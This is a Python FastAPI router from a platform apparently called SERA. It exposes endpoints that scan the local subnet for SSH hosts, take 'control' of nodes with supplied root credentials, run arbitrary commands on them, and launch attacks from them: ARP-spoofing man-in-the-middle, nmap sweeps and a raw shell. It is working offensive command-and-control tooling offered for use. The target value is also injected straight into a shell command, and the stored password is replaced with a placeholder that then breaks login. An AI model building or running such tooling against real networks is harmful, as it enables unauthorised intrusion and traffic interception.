"""
SERA Node Control Router — Control remote nodes
MERGED FROM JULIUS → SERA PLATFORM
"""

import logging
import uuid
from datetime import datetime
from typing import Optional, List, Dict, Any
from fastapi import APIRouter, HTTPException, Depends, Header
from pydantic import BaseModel
from pathlib import Path
import sys

# Add Sera paths
SERA_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(SERA_ROOT))

# ✅ FIXED: Use Sera's actual auth
try:
    from security.measures import get_current_user
except ImportError:
    try:
        from routers.auth import get_current_user
    except ImportError:
        # Fallback auth
        from config import API_KEYS
        
        async def get_current_user(api_key: str = Header(..., alias="X-API-Key")):
            if api_key not in API_KEYS:
                raise HTTPException(status_code=401, detail="Invalid API key")
            return {"id": API_KEYS[api_key], "username": API_KEYS[api_key]}

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/api/nodes", tags=["Node Control"])

# ── Models ──
class ControlRequest(BaseModel):
    node_id: str
    host: str
    port: int = 22
    username: str = "root"
    password: Optional[str] = None
    key_file: Optional[str] = None

class ExecuteRequest(BaseModel):
    node_id: str
    command: str
    timeout: int = 30

class AttackRequest(BaseModel):
    node_id: str
    attack_type: str = "mitm"
    target: Optional[str] = None

# ── In-memory node store ──
_controlled_nodes: Dict[str, Dict] = {}

# ── Node Discovery ──
def discover_nodes(max_nodes: int = 50) -> List[Dict]:
    """Discover potential nodes on the network"""
    nodes = []
    try:
        import socket
        import ipaddress
        
        # Get local network
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Determine subnet
        if local_ip.startswith("192.168.") or local_ip.startswith("10.") or local_ip.startswith("172."):
            parts = local_ip.split(".")
            if len(parts) >= 3:
                base = ".".join(parts[:3])
                # Try common IPs in the range
                for i in range(1, min(max_nodes + 1, 255)):
                    ip = f"{base}.{i}"
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((ip, 22))  # SSH port
                        sock.close()
                        if result == 0:
                            nodes.append({
                                "ip": ip,
                                "status": "reachable",
                                "services": ["ssh"],
                                "discovered_at": datetime.now().isoformat()
                            })
                    except:
                        pass
    except Exception as e:
        logger.warning(f"Node discovery error: {e}")
    
    return nodes

# ── Node Control Functions ──
def control_node(node_id: str, host: str, port: int, 
                 username: str, password: Optional[str] = None,
                 key_file: Optional[str] = None) -> Dict[str, Any]:
    """Take control of a node"""
    if node_id not in _controlled_nodes:
        _controlled_nodes[node_id] = {
            "id": node_id,
            "host": host,
            "port": port,
            "username": username,
            "controlled_at": datetime.now().isoformat(),
            "status": "controlled",
            "commands_executed": 0
        }
        
        # Store credentials securely (in production, use proper vault)
        if password:
            _controlled_nodes[node_id]["password"] = "[REDACTED]"
        if key_file:
            _controlled_nodes[node_id]["key_file"] = key_file
        
        logger.info(f"Node {node_id} controlled at {host}:{port}")
        return {"success": True, "node_id": node_id, "host": host}
    
    return {"success": False, "error": "Node already controlled"}

def execute_on_node(node_id: str, command: str, timeout: int = 30) -> Dict[str, Any]:
    """Execute command on a controlled node"""
    if node_id not in _controlled_nodes:
        return {"success": False, "error": "Node not controlled"}
    
    node = _controlled_nodes[node_id]
    
    # Try to execute command
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Try password or key
        if "password" in node:
            client.connect(hostname=node["host"], port=node["port"],
                          username=node["username"], password=node["password"],
                          timeout=timeout)
        elif "key_file" in node:
            key = paramiko.RSAKey.from_private_key_file(node["key_file"])
            client.connect(hostname=node["host"], port=node["port"],
                          username=node["username"], pkey=key,
                          timeout=timeout)
        else:
            return {"success": False, "error": "No authentication method available"}
        
        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        exit_code = stdout.channel.recv_exit_status()
        client.close()
        
        # Update node
        node["commands_executed"] = node.get("commands_executed", 0) + 1
        node["last_command"] = command
        node["last_execution"] = datetime.now().isoformat()
        
        return {
            "success": exit_code == 0,
            "output": output,
            "error": error,
            "exit_code": exit_code,
            "node_id": node_id
        }
        
    except Exception as e:
        return {"success": False, "error": f"Execution failed: {str(e)}"}

def attack_node(node_id: str, attack_type: str, target: Optional[str] = None) -> Dict[str, Any]:
    """Launch attack from controlled node"""
    if node_id not in _controlled_nodes:
        return {"success": False, "error": "Node not controlled"}
    
    node = _controlled_nodes[node_id]
    
    # Execute attack based on type
    if attack_type == "mitm":
        command = f"python3 -c \"import subprocess; subprocess.run(['arpspoof', '-i', 'eth0', '-t', '{target or '192.168.1.1'}'])\""
    elif attack_type == "scan":
        command = f"nmap -sP {target or '192.168.1.0/24'}"
    elif attack_type == "shell":
        command = "bash"
    else:
        return {"success": False, "error": f"Unknown attack type: {attack_type}"}
    
    # Execute the attack command
    result = execute_on_node(node_id, command)
    result["attack_type"] = attack_type
    result["target"] = target
    
    return result

def get_controlled_nodes() -> List[Dict]:
    """Get list of controlled nodes"""
    return list(_controlled_nodes.values())

def release_node(node_id: str) -> Dict[str, Any]:
    """Release a controlled node"""
    if node_id in _controlled_nodes:
        del _controlled_nodes[node_id]
        return {"success": True, "message": f"Node {node_id} released"}
    return {"success": False, "error": "Node not found"}

# ── API Endpoints ──

@router.post("/discover")
async def api_discover_nodes(max_nodes: int = 50, 
                            current_user = Depends(get_current_user)):
    """Discover potential nodes on the network"""
    nodes = discover_nodes(max_nodes)
    return {
        "status": "success",
        "nodes": nodes,
        "total": len(nodes),
        "user": current_user.get("username") if current_user else "unknown"
    }

@router.post("/control")
async def api_control_node(req: ControlRequest,
                          current_user = Depends(get_current_user)):
    """Take control of a node"""
    if not req.password and not req.key_file:
        raise HTTPException(status_code=400, detail="Password or key_file required")
    
    result = control_node(
        req.node_id, req.host, req.port, 
        req.username, req.password, req.key_file
    )
    
    if not result["success"]:
        raise HTTPException(status_code=400, detail=result.get("error", "Control failed"))
    
    return {
        "status": "success",
        "data": result,
        "user": current_user.get("username") if current_user else "unknown"
    }

@router.post("/execute")
async def api_execute_command(req: ExecuteRequest,
                             current_user = Depends(get_current_user)):
    """Execute command on a controlled node"""
    result = execute_on_node(req.node_id, req.command, req.timeout)
    
    if not result["success"]:
        raise HTTPException(status_code=500, detail=result.get("error", "Execution failed"))
    
    return {
        "status": "success",
        "data": result,
        "user": current_user.get("username") if current_user else "unknown"
    }

@router.post("/attack")
async def api_attack_node(req: AttackRequest,
                         current_user = Depends(get_current_user)):
    """Launch attack from controlled node"""
    result = attack_node(req.node_id, req.attack_type, req.target)
    
    if not result["success"]:
        raise HTTPException(status_code=500, detail=result.get("error", "Attack failed"))
    
    return {
        "status": "success",
        "data": result,
        "user": current_user.get("username") if current_user else "unknown"
    }

@router.get("/controlled")
async def api_get_controlled(current_user = Depends(get_current_user)):
    """Get list of controlled nodes"""
    nodes = get_controlled_nodes()
    return {
        "status": "success",
        "controlled_nodes": nodes,
        "total": len(nodes),
        "user": current_user.get("username") if current_user else "unknown"
    }

@router.delete("/{node_id}")
async def api_release_node(node_id: str,
                          current_user = Depends(get_current_user)):
    """Release a controlled node"""
    result = release_node(node_id)
    
    if not result["success"]:
        raise HTTPException(status_code=404, detail=result.get("error", "Node not found"))
    
    return {
        "status": "success",
        "data": result,
        "user": current_user.get("username") if current_user else "unknown"
    }

@router.get("/status/{node_id}")
async def api_node_status(node_id: str,
                         current_user = Depends(get_current_user)):
    """Get status of a controlled node"""
    if node_id not in _controlled_nodes:
        raise HTTPException(status_code=404, detail="Node not found")
    
    node = _controlled_nodes[node_id]
    return {
        "status": "success",
        "node": node,
        "user": current_user.get("username") if current_user else "unknown"
    }

if __name__ == "__main__":
    print("Sera Node Control Router loaded")